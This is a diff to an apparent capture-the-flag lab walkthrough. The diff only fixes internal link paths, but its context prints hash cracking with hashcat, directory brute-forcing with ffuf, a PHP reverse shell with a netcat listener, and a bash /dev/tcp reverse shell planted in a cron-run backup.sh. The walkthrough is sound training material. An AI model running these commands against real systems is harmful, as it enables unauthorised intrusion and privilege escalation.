@@ -113,7 +113,7 @@ There is a student named 'Run Ham' whose password is `cd73502828457d15655bbd7a63
 Grimmie, whoever they are, *uses the same password everywhere*. We should keep them in mind b/c if we find their password, then we can likely use it multiple times to access other interfaces.
 ## Hashed Password
 The 'password' we got from note.txt is likely actually a hash of a password. There are some tools we can use to try to figure out what the original password is from the hash.
-### [Hash-identifier](/cybersecurity/tools/cracking/hash-id.md)
+### [Hash-identifier](../../../cybersecurity/TTPs/cracking/tools/hash-id.md)
 ... is a tool which takes a hash and outputs the possible/ likely algorithm which created it.
 ```bash
 hash-identifier
@@ -137,7 +137,7 @@ Possible Hashs:
 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 ```
 Now that we know it's an [MD5](/computers/concepts/cryptography/hashing.md) hash, we can try to crack it.
-### [hashcat](/cybersecurity/tools/cracking/hashcat.md)
+### [hashcat](../../../cybersecurity/TTPs/cracking/tools/hashcat.md)
 Hashcat is a command line tool which *uses your CPU* to crack hashes. For this hash we have to put it in a file to give to hashcat to crack:
 ```bash
 hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt 
@@ -166,9 +166,9 @@ Now that we have a username and password, we need to find where we can use them.
 Considering all of our open ports (SSH, FTP, HTTP), we can try to guess where these credentials might work. Starting w/ HTTP may be the easiest place to start since 'academy' could easily be an endpoint.
 
 Instead of checking the academy endpoint in the browser, let's learn about [directory enumeration](/cybersecurity/TTPs/recon/directory-enumeration.md) ('dir busting').
-### [dirb](/cybersecurity/tools/scanning-enumeration/dir-and-subdomain/dirb.md)
+### [dirb](../../../cybersecurity/TTPs/recon/tools/dir-and-subdomain/dirb.md)
 Dirb is a directory busting tool which is *recursive*, meaning it will go into every level of every directory found. This also makes it slow since it enters and enumerates every directory.
-### [ffuf](/cybersecurity/tools/scanning-enumeration/dir-and-subdomain/ffuf.md)
+### [ffuf](../../../cybersecurity/TTPs/recon/tools/dir-and-subdomain/ffuf.md)
 FUFF is another dir busting tool which is *non-recursive*. It enumerates on the level you tell it to when you give the command a placeholder (`FUZZ`):
 ```bash
 ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u http://10.0.2.15/FUZZ
@@ -200,7 +200,7 @@ The fact that we can see our duck in the browser means *the webserver is executi
 ### Reverse Shell
 Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.
 
-PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](/cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](/cybersecurity/tools/exploitation/netcat.md) is listening on the port.
+PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](/cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](../../../cybersecurity/TTPs/exploitation/tools/netcat.md) is listening on the port.
 ```bash
 nc -lvnp 44444
 listening on [any] 44444 ...
@@ -286,7 +286,7 @@ Sun 2023-10-08 11:56:02 EDT  21h left     Sat 2023-10-07 09:10:01 EDT  5h 27min 
 ```
 There are some timers, but none seem to be related to our backup file.
 #### psypy
-[psypy](/cybersecurity/tools/actions-on-objective/psypy.md) is a tool developed by DominicBreuker on GitHub. It allows us to monitor linux processes *without root permissions* w/ live updates. Other linux tools like `top`, `lsof`, and `ps aux` can also be used.
+[psypy](../../../cybersecurity/TTPs/actions-on-objective/tools/psypy.md) is a tool developed by DominicBreuker on GitHub. It allows us to monitor linux processes *without root permissions* w/ live updates. Other linux tools like `top`, `lsof`, and `ps aux` can also be used.
 ##### Usage
 To use psypy as Grimmie we need to get it on the target machine. To do this, first we need to download and install it from the [psypy repo](https://github.com/DominicBreuker/pspy)  on our own machine, then serve it using [HTTP](/www/HTTP.md).
 
@@ -309,7 +309,7 @@ A simple script to achieve a shell using [bash](/coding/languages/bash.md) is th
 
 bash -i >& /dev/tcp/10.0.2.4/44445 0>&1
 ```
-Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. *Before saving the file* make sure you have another instance of [netcat](/cybersecurity/tools/exploitation/netcat.md) up and listening to the correct port.
+Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. *Before saving the file* make sure you have another instance of [netcat](../../../cybersecurity/TTPs/exploitation/tools/netcat.md) up and listening to the correct port.
 
 Once you save the file, it should get executed w/i the next 2 minutes, and on your listener you should see:
 ```bash
